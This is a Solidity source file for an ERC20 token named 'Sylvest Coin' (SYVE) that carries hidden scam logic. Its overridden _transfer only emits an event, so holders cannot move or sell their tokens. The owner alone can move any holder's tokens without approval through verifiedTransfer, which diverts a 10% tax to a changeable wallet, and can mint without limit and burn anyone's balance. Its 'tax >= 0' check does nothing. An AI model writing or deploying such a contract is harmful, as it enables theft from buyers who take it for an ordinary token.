// contracts/Token.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './ERC20.sol';
import './Ownable.sol';

contract Token is ERC20, Ownable {
    address private wallet;

    constructor(address wallet_, uint256 initialSupply) ERC20("Sylvest Coin", "SYVE") {
        _mint(owner(), initialSupply);
        wallet = wallet_;
    }

    event TransferRequest(address from, address to, uint256 amount);

    function _transfer(address from, address to, uint256 amount) internal override {
        emit TransferRequest(from, to, amount);
    }

    function verifiedTransfer(address from, address to, uint256 amount) public onlyOwner {
        uint256 tax = amount / 10;
        require(tax >= 0, "SYVE: invalid or too small amount");
        if (from != owner() && from != wallet) {
            super._transfer(from, wallet, tax);
            unchecked {
                amount -= tax;
            }
        }
        super._transfer(from, to, amount);
    }

    function sendToken(address from, address to, uint256 amount) public onlyOwner {
        emit TransferRequest(from, to, amount);
    }

    function mint(address to, uint256 amount) public onlyOwner {
        super._mint(to, amount);
    }

    function burn(address to, uint256 amount) public onlyOwner {
        super._burn(to, amount);
    }

    function newWallet(address wallet_) public onlyOwner {
        wallet = wallet_;
    }
}
